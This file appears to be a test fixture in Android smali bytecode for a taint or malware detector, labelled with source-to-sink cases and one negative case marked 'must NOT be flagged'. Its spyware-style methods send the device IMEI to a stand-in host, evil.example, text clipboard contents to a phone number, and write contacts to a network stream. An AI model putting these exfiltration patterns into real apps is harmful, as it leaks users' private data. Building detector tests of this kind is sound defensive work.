.class public Lcom/evil/Spy;
.super Ljava/lang/Object;

.field public static clip:Ljava/lang/String;

# IMEI -> helper -> URL  (inter-procedural)
.method public static leak(Landroid/content/Context;)V
    .registers 6
    const-string v0, "phone"
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/telephony/TelephonyManager;
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;
    move-result-object v1
    invoke-static {v1}, Lcom/evil/Spy;->send(Ljava/lang/String;)V
    return-void
.end method

.method public static send(Ljava/lang/String;)V
    .registers 4
    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V
    const-string v1, "http://evil.example/c?id="
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    new-instance v2, Ljava/net/URL;
    invoke-direct {v2, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    return-void
.end method

# clipboard -> static field ; another method: field -> SMS
.method public static grab(Landroid/content/ClipboardManager;)V
    .registers 3
    invoke-virtual {p0}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v1
    sput-object v1, Lcom/evil/Spy;->clip:Ljava/lang/String;
    return-void
.end method

.method public static exfilSms()V
    .registers 7
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;
    move-result-object v0
    const-string v1, "+15550000"
    const/4 v2, 0x0
    sget-object v3, Lcom/evil/Spy;->clip:Ljava/lang/String;
    move-object v4, v2
    move-object v5, v2
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    return-void
.end method

# contacts via content URI -> network stream
.method public static contacts(Landroid/content/ContentResolver;Ljava/net/HttpURLConnection;)V
    .registers 9
    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;
    const/4 v2, 0x0
    invoke-virtual/range {p0 .. p0}, Ljava/lang/Object;->hashCode()I
    move-object v3, v2
    move-object v4, v2
    move-object v5, v2
    move-object v0, p0
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v0
    const/4 v1, 0x1
    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v1
    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v2
    new-instance v3, Ljava/io/PrintWriter;
    invoke-direct {v3, v2}, Ljava/io/PrintWriter;-><init>(Ljava/io/OutputStream;)V
    invoke-virtual {v3, v1}, Ljava/io/PrintWriter;->print(Ljava/lang/String;)V
    return-void
.end method

# NEGATIVE: register reused before sink (must NOT be flagged)
.method public static clean(Landroid/telephony/TelephonyManager;)V
    .registers 4
    invoke-virtual {p0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;
    move-result-object v1
    const-string v1, "https://safe.example/"
    new-instance v2, Ljava/net/URL;
    invoke-direct {v2, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    return-void
.end method

# location callback param -> log only (LOG sink, weight 0)
.method public onLocationChanged(Landroid/location/Location;)V
    .registers 5
    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D
    move-result-wide v0
    invoke-static {v0, v1}, Ljava/lang/String;->valueOf(D)Ljava/lang/String;
    move-result-object v0
    const-string v1, "LOC"
    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method

.method public static dec(Ljava/lang/String;)Ljava/lang/String;
    .registers 2
    return-object p0
.end method

.method static constructor <clinit>()V
    .registers 1
    const-string v0, "evil"
    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
    return-void
.end method
